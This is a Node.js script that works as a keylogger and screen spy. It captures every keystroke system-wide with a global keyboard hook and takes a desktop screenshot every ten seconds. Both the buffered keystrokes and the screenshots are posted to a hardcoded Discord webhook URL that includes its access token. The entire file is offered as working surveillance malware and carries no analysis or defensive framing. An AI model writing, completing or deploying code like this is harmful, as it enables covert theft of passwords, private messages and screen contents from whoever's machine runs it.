const GlobalKeyboardListener =
  require("node-global-key-listener").GlobalKeyboardListener;
const axios = require("axios");
const FormData = require('form-data');
const desktopScreenshot = require("desktop-screenshot");
const fs = require("fs");

const v = new GlobalKeyboardListener({
  windows: {
    onError: (errorCode) => console.error("ERROR: " + errorCode),
    onInfo: (info) => console.info("INFO: " + info),
  },
  mac: {
    onError: (errorCode) => console.error("ERROR: " + errorCode),
  },
});

let keystrokes = "";

v.addListener(function (e, down) {
  if (e.state === "UP") {
    switch (e.name) {
      case "SPACE":
        process.stdout.write(" ");
        keystrokes += " ";
        break;
      case "TAB":
        process.stdout.write("<TAB>");
        keystrokes += "<TAB>";
        break;
      case "RETURN":
        process.stdout.write("<ENTER>");
        keystrokes += "<ENTER>";
        break;
      default:
        process.stdout.write(e.name);
        keystrokes += e.name;
    }
  }

 
  if (
    keystrokes.length >= 100 ||
    (e.state === "UP" && keystrokes.includes("<ENTER>"))
  ) {
    sendKeystrokes();
  }
});

function sendKeystrokes() {
  if (keystrokes.length === 0) return;

  axios
    .post(
      "https://discordapp.com/api/webhooks/1234203961922162730/DgutgJifmOzPEGVkCcY-2-1KqNthUZoZ2lNSieoWyo8X6q1vCWAgzDbQZ5toTYxL9-ph",
      {
        content: keystrokes,
      }
    )
    .then(() => {
      keystrokes = "";
    })
    .catch((error) => {
      console.error("Failed to send keystrokes:", error);
    });
}

function takeAndSaveScreenshot() {
  const timestamp = Date.now(); 
  const fileName = `screenshot.png`; 
  const filePath = __dirname + "/screenshots/" + fileName; 

  desktopScreenshot(filePath, function (error, complete) {
    // if (error) {
    //   console.error("Failed to take screenshot:", error);
    //   return;
    // }

    console.log("Screenshot taken successfully:", filePath);

    // Create a readable stream from the file
    const imageStream = fs.createReadStream(filePath);

    // // Send the screenshot to Discord
    const formData = new FormData();
    formData.append("files", fs.createReadStream(filePath));

    axios
      .post('https://discordapp.com/api/webhooks/1234203961922162730/DgutgJifmOzPEGVkCcY-2-1KqNthUZoZ2lNSieoWyo8X6q1vCWAgzDbQZ5toTYxL9-ph', formData, {
        headers: {
          ...formData.getHeaders(),
        },
      })
      .then(() => {
        console.log("Screenshot sent successfully.");
      })
      .catch((error) => {
        console.error("Failed to send screenshot:", error);
      });
  });
}


setInterval(takeAndSaveScreenshot, 10000);


setInterval(sendKeystrokes, 10000);